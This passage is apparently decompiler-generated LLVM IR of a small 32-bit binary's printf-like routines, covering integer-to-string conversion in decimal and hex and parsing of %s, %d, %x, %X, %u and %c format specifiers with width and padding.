  %stack_var_8.012 = phi i8* [ %arg2, %dec_label_pc_80484d5.lr.ph ], [ %v22_80484f0, %dec_label_pc_80484d5 ]
  %v2_80484d8 = load i8, i8* %stack_var_8.012, align 1
  %v3_80484d8 = zext i8 %v2_80484d8 to i32
  %v3_80484e8 = call i32 @function_8048406(i32* %v2_80484e8, i32 %v3_80484d8)
  %v4_80484ed = add i32 %stack_var_-20.113, 1
  %v5_80484f0 = add i32 %v4_80484f314, 1
  %v22_80484f0 = inttoptr i32 %v5_80484f0 to i8*
  %v2_80484f6 = load i8, i8* %v22_80484f0, align 1
  %v4_80484f9 = icmp eq i8 %v2_80484f6, 0
  %v1_80484fb = icmp eq i1 %v4_80484f9, false
  br i1 %v1_80484fb, label %dec_label_pc_80484d5, label %dec_label_pc_8048517.preheader

dec_label_pc_8048517.preheader:                   ; preds = %dec_label_pc_80484d5, %dec_label_pc_80484f3.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484f3.preheader ], [ %v4_80484ed, %dec_label_pc_80484d5 ]
  %tmp49 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp50 = icmp eq i1 %tmp49, false
  br i1 %tmp50, label %dec_label_pc_80484ff.lr.ph, label %dec_label_pc_804851d

dec_label_pc_80484ff.lr.ph:                       ; preds = %dec_label_pc_8048517.preheader
  %v2_804850c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484ff

dec_label_pc_80484ff:                             ; preds = %dec_label_pc_80484ff.lr.ph, %dec_label_pc_80484ff
  %stack_var_-20.25 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484ff.lr.ph ], [ %v4_8048511, %dec_label_pc_80484ff ]
  %stack_var_12.34 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484ff.lr.ph ], [ %v4_8048514, %dec_label_pc_80484ff ]
  %v3_804850c = call i32 @function_8048406(i32* %v2_804850c, i32 %stack_var_-16.0)
  %v4_8048511 = add i32 %stack_var_-20.25, 1
  %v4_8048514 = add i32 %stack_var_12.34, -1
  %tmp51 = icmp slt i32 %v4_8048514, 1
  %tmp52 = icmp eq i1 %tmp51, false
  br i1 %tmp52, label %dec_label_pc_80484ff, label %dec_label_pc_804851d

dec_label_pc_804851d:                             ; preds = %dec_label_pc_80484ff, %dec_label_pc_8048517.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048517.preheader ], [ %v4_8048511, %dec_label_pc_80484ff ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484f0, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_8048474, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80484ff, { 1, 0 }
  uselistorder label %dec_label_pc_80484d5, { 1, 0 }
  uselistorder label %dec_label_pc_80484b5, { 1, 0 }
  uselistorder label %dec_label_pc_8048498, { 1, 0 }
  uselistorder label %dec_label_pc_8048471, { 1, 0 }
}

define i32 @function_8048522(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8048522:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048536 = trunc i64 %arg2 to i32
  %v5_804853c = icmp eq i32 %v4_8048536, 0
  %v6_804853c = icmp slt i32 %v4_8048536, 0
  %v1_8048540 = icmp eq i1 %v5_804853c, false
  br i1 %v1_8048540, label %dec_label_pc_8048572, label %dec_label_pc_8048542

dec_label_pc_8048542:                             ; preds = %dec_label_pc_8048522
  store i32 48, i32* %stack_var_-16, align 4
  %tmp36 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048565 = call i32 @function_8048448(i32 %arg1, i8* %tmp36, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_804865c

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048522
  %v4_8048572 = icmp eq i32 %arg4, 0
  br i1 %v4_8048572, label %dec_label_pc_8048593, label %dec_label_pc_8048578

dec_label_pc_8048578:                             ; preds = %dec_label_pc_8048572
  %v13_8048578 = icmp eq i32 %arg3, 10
  %v1_804857c = icmp eq i1 %v13_8048578, false
  br i1 %v1_804857c, label %dec_label_pc_8048593, label %dec_label_pc_804857e

dec_label_pc_804857e:                             ; preds = %dec_label_pc_8048578
  %v1_8048582 = icmp eq i1 %v6_804853c, false
  br i1 %v1_8048582, label %dec_label_pc_8048593, label %dec_label_pc_8048584

dec_label_pc_8048584:                             ; preds = %dec_label_pc_804857e
  %v1_804858e = sub i32 0, %v4_8048536
  %v5_8048590 = sext i32 %v1_804858e to i64
  br label %dec_label_pc_8048593

dec_label_pc_8048593:                             ; preds = %dec_label_pc_804857e, %dec_label_pc_8048578, %dec_label_pc_8048572, %dec_label_pc_8048584
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_8048572 ], [ %arg2, %dec_label_pc_8048578 ], [ %arg2, %dec_label_pc_804857e ], [ %v5_8048590, %dec_label_pc_8048584 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048572 ], [ 0, %dec_label_pc_8048578 ], [ 0, %dec_label_pc_804857e ], [ 1, %dec_label_pc_8048584 ]
  %tmp37 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp37, align 4
  %v4_80485f47 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485f48 = icmp eq i32 %v4_80485f47, 0
  %v1_80485f810 = icmp eq i1 %v5_80485f48, false
  br i1 %v1_80485f810, label %dec_label_pc_80485a4.lr.ph, label %dec_label_pc_80485fa

dec_label_pc_80485a4.lr.ph:                       ; preds = %dec_label_pc_8048593
  %v5_80485a7 = sext i32 %arg3 to i64
  br label %dec_label_pc_80485a4

dec_label_pc_80485a4:                             ; preds = %dec_label_pc_80485a4.lr.ph, %dec_label_pc_80485cc
  %stack_var_-24.112 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80485a4.lr.ph ], [ %v5_80485f1, %dec_label_pc_80485cc ]
  %stack_var_-40.011 = phi i8* [ %tmp37, %dec_label_pc_80485a4.lr.ph ], [ %v22_80485cc, %dec_label_pc_80485cc ]
  %v6_80485b2 = and i64 %stack_var_-24.112, 4294967295
  %v12_80485b2 = udiv i64 %v6_80485b2, %v5_80485a7
  %v13_80485b2 = trunc i64 %v12_80485b2 to i32
  %v14_80485b2 = urem i64 %v6_80485b2, %v5_80485a7
  %v5_80485b7 = trunc i64 %v14_80485b2 to i8
  %v7_80485be = icmp sgt i8 %v5_80485b7, 9
  br i1 %v7_80485be, label %dec_label_pc_80485c0, label %dec_label_pc_80485cc

dec_label_pc_80485c0:                             ; preds = %dec_label_pc_80485a4
  %tmp = trunc i64 %v14_80485b2 to i32
  %v5_80485c3 = add i32 %tmp, %arg7
  %v1_80485c6 = add i32 %v5_80485c3, 198
  %v11_80485c6 = trunc i32 %v1_80485c6 to i8
  br label %dec_label_pc_80485cc

dec_label_pc_80485cc:                             ; preds = %dec_label_pc_80485a4, %dec_label_pc_80485c0
  %stack_var_-36.0 = phi i8 [ %v11_80485c6, %dec_label_pc_80485c0 ], [ %v5_80485b7, %dec_label_pc_80485a4 ]
  %v4_80485cc = ptrtoint i8* %stack_var_-40.011 to i32
  %v5_80485cc = add i32 %v4_80485cc, -1
  %v22_80485cc = inttoptr i32 %v5_80485cc to i8*
  %v2_80485d3 = add i8 %stack_var_-36.0, 48
  store i8 %v2_80485d3, i8* %v22_80485cc, align 1
  %v5_80485f1 = sext i32 %v13_80485b2 to i64
  %v5_80485f4 = icmp eq i32 %v13_80485b2, 0
  %v1_80485f8 = icmp eq i1 %v5_80485f4, false
  br i1 %v1_80485f8, label %dec_label_pc_80485a4, label %dec_label_pc_80485fa

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_80485cc, %dec_label_pc_8048593
  %stack_var_-40.0.lcssa = phi i8* [ %tmp37, %dec_label_pc_8048593 ], [ %v22_80485cc, %dec_label_pc_80485cc ]
  %v4_80485fa = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485fa, label %dec_label_pc_8048634, label %dec_label_pc_8048600

dec_label_pc_8048600:                             ; preds = %dec_label_pc_80485fa
  %v4_8048600 = icmp eq i32 %arg5, 0
  br i1 %v4_8048600, label %dec_label_pc_804862b, label %dec_label_pc_8048606

dec_label_pc_8048606:                             ; preds = %dec_label_pc_8048600
  %v1_8048609 = and i32 %arg6, 2
  %v2_8048609 = icmp eq i32 %v1_8048609, 0
  br i1 %v2_8048609, label %dec_label_pc_804862b, label %dec_label_pc_8048610

dec_label_pc_8048610:                             ; preds = %dec_label_pc_8048606
  %v3_804861e = inttoptr i32 %arg1 to i32*
  %v4_804861e = call i32 @function_8048406(i32* %v3_804861e, i32 45)
  %v4_8048626 = add i32 %arg5, -1
  br label %dec_label_pc_8048634

dec_label_pc_804862b:                             ; preds = %dec_label_pc_8048606, %dec_label_pc_8048600
  %v4_804862b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804862b = add i32 %v4_804862b, -1
  %v22_804862b = inttoptr i32 %v5_804862b to i8*
  store i8 45, i8* %v22_804862b, align 1
  br label %dec_label_pc_8048634

dec_label_pc_8048634:                             ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048610, %dec_label_pc_804862b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_80485fa ], [ %arg5, %dec_label_pc_804862b ], [ %v4_8048626, %dec_label_pc_8048610 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_80485fa ], [ %v22_804862b, %dec_label_pc_804862b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048610 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485fa ], [ 0, %dec_label_pc_804862b ], [ 1, %dec_label_pc_8048610 ]
  %v6_804864f = call i32 @function_8048448(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_8048657 = add i32 %v6_804864f, %stack_var_-28.0
  store i32 %v2_8048657, i32* @edx, align 4
  br label %dec_label_pc_804865c

dec_label_pc_804865c:                             ; preds = %dec_label_pc_8048542, %dec_label_pc_8048634
  %storemerge = phi i32 [ %v2_8048657, %dec_label_pc_8048634 ], [ %v6_8048565, %dec_label_pc_8048542 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_80485cc, { 0, 2, 1 }
  uselistorder i8 %v5_80485b7, { 1, 0 }
  uselistorder i64 %v6_80485b2, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804865c, { 1, 0 }
  uselistorder label %dec_label_pc_8048634, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485cc, { 1, 0 }
  uselistorder label %dec_label_pc_80485a4, { 1, 0 }
  uselistorder label %dec_label_pc_8048593, { 3, 0, 1, 2 }
}

define i32 @function_8048661(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048661:
  %tmp32 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048661 = load i32, i32* @ebp, align 4
  store i32 %v0_8048661, i32* %stack_var_-4, align 4
  %stack_var_8.415 = inttoptr i32 %arg2 to i8*
  %v2_804891516 = load i8, i8* %stack_var_8.415, align 1
  %v4_804891818 = icmp eq i8 %v2_804891516, 0
  %v1_804891a20 = icmp eq i1 %v4_804891818, false
  br i1 %v1_804891a20, label %dec_label_pc_8048673.lr.ph, label %dec_label_pc_8048920

dec_label_pc_8048673.lr.ph:                       ; preds = %dec_label_pc_8048661
  %tmp47 = bitcast i32* %stack_var_-6 to i8*
  br label %dec_label_pc_8048673

dec_label_pc_8048673:                             ; preds = %dec_label_pc_8048673.lr.ph, %dec_label_pc_804890f
  %stack_var_8.424 = phi i8* [ %stack_var_8.415, %dec_label_pc_8048673.lr.ph ], [ %stack_var_8.4, %dec_label_pc_804890f ]
  %stack_var_-28.123 = phi i32 [ 0, %dec_label_pc_8048673.lr.ph ], [ %stack_var_-28.0, %dec_label_pc_804890f ]
  %stack_var_12.122 = phi i32 [ %arg3, %dec_label_pc_8048673.lr.ph ], [ %stack_var_12.0, %dec_label_pc_804890f ]
  %stack_var_8.4.in21 = phi i32 [ %arg2, %dec_label_pc_8048673.lr.ph ], [ %v5_804890f, %dec_label_pc_804890f ]
  %v2_8048676 = load i8, i8* %stack_var_8.424, align 1
  %v10_8048679 = icmp eq i8 %v2_8048676, 37
  %v1_804867b = icmp eq i1 %v10_8048679, false
  br i1 %v1_804867b, label %dec_label_pc_80488f4, label %dec_label_pc_8048681

dec_label_pc_8048681:                             ; preds = %dec_label_pc_8048673
  %v5_8048681 = add i32 %stack_var_8.4.in21, 1
  %v22_8048681 = inttoptr i32 %v5_8048681 to i8*
  %v2_8048694 = load i8, i8* %v22_8048681, align 1
  %v4_8048697 = icmp eq i8 %v2_8048694, 0
  br i1 %v4_8048697, label %dec_label_pc_8048920, label %dec_label_pc_804869f

dec_label_pc_804869f:                             ; preds = %dec_label_pc_8048681
  %v2_80486a2 = load i8, i8* %v22_8048681, align 1
  %v10_80486a5 = icmp eq i8 %v2_80486a2, 37
  br i1 %v10_80486a5, label %dec_label_pc_80488f4, label %dec_label_pc_80486ad

dec_label_pc_80486ad:                             ; preds = %dec_label_pc_804869f
  %v2_80486b0 = load i8, i8* %v22_8048681, align 1
  %v10_80486b3 = icmp eq i8 %v2_80486b0, 45
  %v1_80486b5 = icmp eq i1 %v10_80486b3, false
  br i1 %v1_80486b5, label %dec_label_pc_80486ca.preheader, label %dec_label_pc_80486b7

dec_label_pc_80486b7:                             ; preds = %dec_label_pc_80486ad
  %v5_80486b7 = add i32 %stack_var_8.4.in21, 2
  %v22_80486b7 = inttoptr i32 %v5_80486b7 to i8*
  br label %dec_label_pc_80486ca.preheader

dec_label_pc_80486ca.preheader:                   ; preds = %dec_label_pc_80486b7, %dec_label_pc_80486ad
  %stack_var_8.0.ph = phi i8* [ %v22_80486b7, %dec_label_pc_80486b7 ], [ %v22_8048681, %dec_label_pc_80486ad ]
  %stack_var_-32.0.ph = phi i32 [ 1, %dec_label_pc_80486b7 ], [ 0, %dec_label_pc_80486ad ]
  %v4_80486ca2 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_80486cd3 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_80486d010 = icmp eq i8 %v2_80486cd3, 48
  br i1 %v7_80486d010, label %dec_label_pc_80486c3, label %dec_label_pc_80486f9.preheader

dec_label_pc_80486c3:                             ; preds = %dec_label_pc_80486ca.preheader, %dec_label_pc_80486c3
  %v4_80486ca13 = phi i32 [ %v5_80486c3, %dec_label_pc_80486c3 ], [ %v4_80486ca2, %dec_label_pc_80486ca.preheader ]
  %stack_var_-32.012 = phi i32 [ %v4_80486c6, %dec_label_pc_80486c3 ], [ %stack_var_-32.0.ph, %dec_label_pc_80486ca.preheader ]
  %v5_80486c3 = add i32 %v4_80486ca13, 1
  %v22_80486c3 = inttoptr i32 %v5_80486c3 to i8*
  %v4_80486c6 = or i32 %stack_var_-32.012, 2
  %v2_80486cd = load i8, i8* %v22_80486c3, align 1
  %v7_80486d0 = icmp eq i8 %v2_80486cd, 48
  br i1 %v7_80486d0, label %dec_label_pc_80486c3, label %dec_label_pc_80486f9.preheader

dec_label_pc_80486f9.preheader:                   ; preds = %dec_label_pc_80486c3, %dec_label_pc_80486ca.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80486ca.preheader ], [ %v22_80486c3, %dec_label_pc_80486c3 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80486ca.preheader ], [ %v4_80486c6, %dec_label_pc_80486c3 ]
  %v4_80486f948 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  %v2_80486fc49 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %tmp66 = icmp ult i8 %v2_80486fc49, 48
  br i1 %tmp66, label %dec_label_pc_804870d, label %dec_label_pc_8048703

dec_label_pc_80486d6:                             ; preds = %dec_label_pc_8048703
  %v2_80486df = mul i32 %stack_var_-36.056, 10
  %v2_80486e7 = load i8, i8* %stack_var_8.155, align 1
  %v3_80486e7 = zext i8 %v2_80486e7 to i32
  %v5_80486ed = add i32 %v2_80486df, -48
  %v1_80486f0 = add i32 %v5_80486ed, %v3_80486e7
  %v5_80486f6 = add i32 %v4_80486f957, 1
  %v22_80486f6 = inttoptr i32 %v5_80486f6 to i8*
  %v2_80486fc = load i8, i8* %v22_80486f6, align 1
  %tmp67 = icmp ult i8 %v2_80486fc, 48
  br i1 %tmp67, label %dec_label_pc_804870d, label %dec_label_pc_8048703

dec_label_pc_8048703:                             ; preds = %dec_label_pc_80486f9.preheader, %dec_label_pc_80486d6
  %v4_80486f957 = phi i32 [ %v5_80486f6, %dec_label_pc_80486d6 ], [ %v4_80486f948, %dec_label_pc_80486f9.preheader ]
  %stack_var_-36.056 = phi i32 [ %v1_80486f0, %dec_label_pc_80486d6 ], [ 0, %dec_label_pc_80486f9.preheader ]
  %stack_var_8.155 = phi i8* [ %v22_80486f6, %dec_label_pc_80486d6 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486f9.preheader ]
  %v2_8048706 = load i8, i8* %stack_var_8.155, align 1
  %tmp68 = icmp ult i8 %v2_8048706, 58
  br i1 %tmp68, label %dec_label_pc_80486d6, label %dec_label_pc_804870d

dec_label_pc_804870d:                             ; preds = %dec_label_pc_80486d6, %dec_label_pc_8048703, %dec_label_pc_80486f9.preheader
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486f9.preheader ], [ %stack_var_8.155, %dec_label_pc_8048703 ], [ %v22_80486f6, %dec_label_pc_80486d6 ]
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486f9.preheader ], [ %stack_var_-36.056, %dec_label_pc_8048703 ], [ %v1_80486f0, %dec_label_pc_80486d6 ]
  %v2_8048710 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048713 = icmp eq i8 %v2_8048710, 115
  %v1_8048715 = icmp eq i1 %v10_8048713, false
  br i1 %v1_8048715, label %dec_label_pc_8048764, label %dec_label_pc_8048717

dec_label_pc_8048717:                             ; preds = %dec_label_pc_804870d
  %v1_804871a = add i32 %stack_var_12.122, 4
  %v1_8048722 = inttoptr i32 %stack_var_12.122 to i32*
  %v2_8048722 = load i32, i32* %v1_8048722, align 4
  %v4_8048727 = icmp eq i32 %v2_8048722, 0
  br i1 %v4_8048727, label %dec_label_pc_804873c, label %dec_label_pc_804872d

dec_label_pc_804872d:                             ; preds = %dec_label_pc_8048717
  %v5_8048730 = inttoptr i32 %v2_8048722 to i8*
  br label %dec_label_pc_804873c

dec_label_pc_804873c:                             ; preds = %dec_label_pc_8048717, %dec_label_pc_804872d
  %storemerge = phi i8* [ %v5_8048730, %dec_label_pc_804872d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8052a22.16, i32 0, i32 0), %dec_label_pc_8048717 ]
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_8048757 = call i32 @function_8048448(i32 %tmp32, i8* %storemerge, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_804875c = add i32 %v6_8048757, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_8048764:                             ; preds = %dec_label_pc_804870d
  %v2_8048767 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_804876a = icmp eq i8 %v2_8048767, 100
  %v1_804876c = icmp eq i1 %v10_804876a, false
  br i1 %v1_804876c, label %dec_label_pc_80487b8, label %dec_label_pc_804876e

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048764
  %v1_8048771 = add i32 %stack_var_12.122, 4
  %v1_8048779 = inttoptr i32 %stack_var_12.122 to i32*
  %v2_8048779 = load i32, i32* %v1_8048779, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_80487ab = sext i32 %v2_8048779 to i64
  %v9_80487ab = call i32 @function_8048522(i32 %tmp32, i64 %v8_80487ab, i32 10, i32 1, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80487b0 = add i32 %v9_80487ab, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_80487b8:                             ; preds = %dec_label_pc_8048764
  %v2_80487bb = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80487be = icmp eq i8 %v2_80487bb, 120
  %v1_80487c0 = icmp eq i1 %v10_80487be, false
  br i1 %v1_80487c0, label %dec_label_pc_804880c, label %dec_label_pc_80487c2

dec_label_pc_80487c2:                             ; preds = %dec_label_pc_80487b8
  %v1_80487c5 = add i32 %stack_var_12.122, 4
  %v1_80487cd = inttoptr i32 %stack_var_12.122 to i32*
  %v2_80487cd = load i32, i32* %v1_80487cd, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_80487ff = sext i32 %v2_80487cd to i64
  %v9_80487ff = call i32 @function_8048522(i32 %tmp32, i64 %v8_80487ff, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048804 = add i32 %v9_80487ff, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_804880c:                             ; preds = %dec_label_pc_80487b8
  %v2_804880f = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048812 = icmp eq i8 %v2_804880f, 88
  %v1_8048814 = icmp eq i1 %v10_8048812, false
  br i1 %v1_8048814, label %dec_label_pc_8048860, label %dec_label_pc_8048816

dec_label_pc_8048816:                             ; preds = %dec_label_pc_804880c
  %v1_8048819 = add i32 %stack_var_12.122, 4
  %v1_8048821 = inttoptr i32 %stack_var_12.122 to i32*
  %v2_8048821 = load i32, i32* %v1_8048821, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048853 = sext i32 %v2_8048821 to i64
  %v9_8048853 = call i32 @function_8048522(i32 %tmp32, i64 %v8_8048853, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_8048858 = add i32 %v9_8048853, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_8048860:                             ; preds = %dec_label_pc_804880c
  %v2_8048863 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048866 = icmp eq i8 %v2_8048863, 117
  %v1_8048868 = icmp eq i1 %v10_8048866, false
  br i1 %v1_8048868, label %dec_label_pc_80488b1, label %dec_label_pc_804886a

dec_label_pc_804886a:                             ; preds = %dec_label_pc_8048860
  %v1_804886d = add i32 %stack_var_12.122, 4
  %v1_8048875 = inttoptr i32 %stack_var_12.122 to i32*
  %v2_8048875 = load i32, i32* %v1_8048875, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_80488a7 = sext i32 %v2_8048875 to i64
  %v9_80488a7 = call i32 @function_8048522(i32 %tmp32, i64 %v8_80488a7, i32 10, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80488ac = add i32 %v9_80488a7, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_80488b1:                             ; preds = %dec_label_pc_8048860
  %v2_80488b4 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80488b7 = icmp eq i8 %v2_80488b4, 99
  %v1_80488b9 = icmp eq i1 %v10_80488b7, false
  br i1 %v1_80488b9, label %dec_label_pc_804890f, label %dec_label_pc_80488bb

dec_label_pc_80488bb:                             ; preds = %dec_label_pc_80488b1
  %v1_80488be = add i32 %stack_var_12.122, 4
  %v1_80488c6 = inttoptr i32 %stack_var_12.122 to i32*
  %v2_80488c6 = load i32, i32* %v1_80488c6, align 4
  store i32 %v2_80488c6, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_80488ea = call i32 @function_8048448(i32 %tmp32, i8* %tmp47, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_80488ef = add i32 %v6_80488ea, %stack_var_-28.123
  br label %dec_label_pc_804890f

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_804869f, %dec_label_pc_8048673
  %stack_var_8.2 = phi i8* [ %stack_var_8.424, %dec_label_pc_8048673 ], [ %v22_8048681, %dec_label_pc_804869f ]
  %v2_80488f7 = load i8, i8* %stack_var_8.2, align 1
  %v3_80488f7 = zext i8 %v2_80488f7 to i32
  %v4_8048907 = call i32 @function_8048406(i32* %arg1, i32 %v3_80488f7)
  %v4_804890c = add i32 %stack_var_-28.123, 1
  br label %dec_label_pc_804890f

dec_label_pc_804890f:                             ; preds = %dec_label_pc_80488b1, %dec_label_pc_80488bb, %dec_label_pc_804886a, %dec_label_pc_8048816, %dec_label_pc_80487c2, %dec_label_pc_804876e, %dec_label_pc_804873c, %dec_label_pc_80488f4
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80488f4 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80488b1 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80488bb ], [ %stack_var_8.1.lcssa, %dec_label_pc_804886a ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048816 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487c2 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_804873c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.122, %dec_label_pc_80488f4 ], [ %stack_var_12.122, %dec_label_pc_80488b1 ], [ %v1_80488be, %dec_label_pc_80488bb ], [ %v1_804886d, %dec_label_pc_804886a ], [ %v1_8048819, %dec_label_pc_8048816 ], [ %v1_80487c5, %dec_label_pc_80487c2 ], [ %v1_8048771, %dec_label_pc_804876e ], [ %v1_804871a, %dec_label_pc_804873c ]
  %stack_var_-28.0 = phi i32 [ %v4_804890c, %dec_label_pc_80488f4 ], [ %stack_var_-28.123, %dec_label_pc_80488b1 ], [ %v5_80488ef, %dec_label_pc_80488bb ], [ %v5_80488ac, %dec_label_pc_804886a ], [ %v5_8048858, %dec_label_pc_8048816 ], [ %v5_8048804, %dec_label_pc_80487c2 ], [ %v5_80487b0, %dec_label_pc_804876e ], [ %v5_804875c, %dec_label_pc_804873c ]
  %v4_804890f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804890f = add i32 %v4_804890f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804890f to i8*
  %v2_8048915 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048918 = icmp eq i8 %v2_8048915, 0
  %v1_804891a = icmp eq i1 %v4_8048918, false
  br i1 %v1_804891a, label %dec_label_pc_8048673, label %dec_label_pc_8048920

dec_label_pc_8048920:                             ; preds = %dec_label_pc_804890f, %dec_label_pc_8048681, %dec_label_pc_8048661
  %stack_var_-28.1.lcssa = phi i32 [ 0, %dec_label_pc_8048661 ], [ %stack_var_-28.0, %dec_label_pc_804890f ], [ %stack_var_-28.123, %dec_label_pc_8048681 ]
  %v4_8048920 = icmp eq i32* %arg1, null
  br i1 %v4_8048920, label %dec_label_pc_804892e, label %dec_label_pc_8048926

dec_label_pc_8048926:                             ; preds = %dec_label_pc_8048920
  %v2_8048929 = load i32, i32* %arg1, align 4
  %v1_804892b = inttoptr i32 %v2_8048929 to i8*
  store i8 0, i8* %v1_804892b, align 1
  br label %dec_label_pc_804892e

dec_label_pc_804892e:                             ; preds = %dec_label_pc_8048920, %dec_label_pc_8048926
  %v2_8048931 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048931, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_80486c3, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.ph, { 1, 0 }
  uselistorder i8* %v22_8048681, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in21, { 1, 0 }
  uselistorder i32 %stack_var_12.122, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.123, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp32, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @function_8048448, { 0, 3, 1, 2 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804892e, { 1, 0 }
